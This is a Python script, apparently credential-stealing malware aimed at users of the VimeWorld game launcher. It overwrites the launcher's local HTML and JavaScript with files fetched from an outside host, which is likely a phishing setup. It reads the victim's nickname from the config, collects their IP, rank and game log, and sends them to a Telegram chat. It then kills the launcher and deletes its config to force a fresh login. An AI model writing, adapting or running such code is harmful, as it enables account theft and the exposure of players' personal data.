import requests
import telebot
import getpass
import os
import PyQt5
import sys
import time
import json
import psutil
os.system("title Запуск")
vimeworldpath = f"C:/Users/{getpass.getuser()}/AppData/Roaming/.vimeworld"
sendchatid = '1112270370'
bot = telebot.TeleBot('t0k3n')
r = requests.get('https://domen.zone/path/to/index.html')
r.encoding = 'utf-8'
rjs = requests.get('https://domen.zone/path/to/vimeworld.php?chatid=' + sendchatid)
rjs.encoding = 'utf-8'
try: 
    file = open(f'{vimeworldpath}/.data\html/index.html','w' , encoding='utf-8')
    file.write(r.text) 
    file.close()
    file = open(f'{vimeworldpath}/.data\html/js/vimeworld.min.js','w' , encoding='utf-8') 
    file.write(rjs.text) 
    file.close()
except FileNotFoundError: 
    os.system("Pause")
    quit() 
try: 
    config = open(f'{vimeworldpath}/config')
except FileNotFoundError: 
    os.system("Pause")
    quit()
fstr = config.read().splitlines()
usernick = fstr[1].replace('username:','')
try: 
    log = open(f'{vimeworldpath}/minigames\logs/latest.log', 'rb')
except FileNotFoundError: 
    pass
userapi = requests.get('https://api.vimeworld.ru/user/name/' + usernick).text
jsonuserapi = userapi.json()
userrank = jsonuserapi[0]["rank"]
userip = requests.get('https://domen.zone/path/to/ip.php').text
text2bot = f"""
🤦‍♂️Открытие программы🤦‍♂️
💣Ник : <b>{usernick}</b>💣
└{jsonuserapi[0]["level"]} Уровень
💴Донат: <b>{userrank} </b> 💴
🖥IP: <a href="https://check-host.net/ip-info?host={userip}">{userip}</a>🖥
👉Статистика: <a href="https://vime.top/p/{usernick}">VimeTop</a>👈
👉Статистика: <a href="https://vimestats.xyz/player/{usernick}">VimeStats</a>👈
👇Актуальный игровой лог👇
"""
bot.send_message(sendchatid, text2bot, parse_mode='HTML')
bot.send_document(sendchatid, log)
try: 
    log.close()
except: 
    pass
config.close()
for process in (process for process in psutil.process_iter() if process.name()=="VimeWorld.exe"):
    process.kill()
try:
    os.remove(f'{vimeworldpath}/config')
except FileNotFoundError:
    pass
